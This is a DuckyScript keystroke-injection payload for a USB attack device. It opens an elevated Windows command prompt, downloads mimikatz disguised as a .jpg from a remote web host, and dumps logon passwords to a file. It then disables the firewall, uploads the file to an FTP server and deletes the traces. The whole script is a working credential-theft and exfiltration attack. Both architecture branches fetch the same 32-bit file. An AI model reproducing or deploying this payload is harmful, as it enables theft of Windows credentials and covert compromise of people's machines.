REM Author: Pesce
REM Modified for FTP by ThePlasmaRailgun
REM Date: 10/20/2013
REM Downloads mimikatz for 64 bit or 32 bit systems and uploads result to FTP server
REM -------------open command prompt with admin privileges
DELAY 3000
CONTROL ESCAPE
DELAY 1000
STRING cmd
DELAY 1000
CTRL-SHIFT ENTER
DELAY 1000
ALT y
ENTER
DELAY 300
REM -------------download appropriate mimikatz for architecture
STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('https://pwningstuff.000webhostapp.com/executables/pw32.jpg','%TEMP%\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('https://pwningstuff.000webhostapp.com/executables/pw32.jpg','%TEMP%\pw.exe');}
ENTER
DELAY 5000
REM -------------get the passwords and save to c:\pwlog.txt
STRING %TEMP%\pw.exe > c:\pwlog.txt & type pwlog.txt;
ENTER
DELAY 2000
STRING privilege::debug
ENTER
DELAY 1000
STRING sekurlsa::logonPasswords full
ENTER
DELAY 1000
STRING exit
ENTER
DELAY 300
STRING del %TEMP%\pw.exe
ENTER
DELAY 300
REM -------------upload log to FTP server
STRING netsh firewall set opmode mode=disable
ENTER
DELAY 400
STRING cd %USERPROFILE%
ENTER
DELAY 400
STRING ftp -i 192.168.1.1
ENTER
DELAY 400
STRING USERNAME
ENTER
DELAY 400
STRING PASSWORD
ENTER
DELAY 600
STRING prompt
ENTER
DELAY 400
STRING prompt
ENTER
DELAY 400
STRING MPUT c:\pwlog.txt
ENTER
DELAY 4000
STRING bye
ENTER
DELAY 400
ENTER
DELAY 200
STRING netsh firewall set opmode mode=enable
REM -------------------- delete pwlog
STRING del c:\pwlog.txt
ENTER
DELAY 300
STRING exit
ENTER
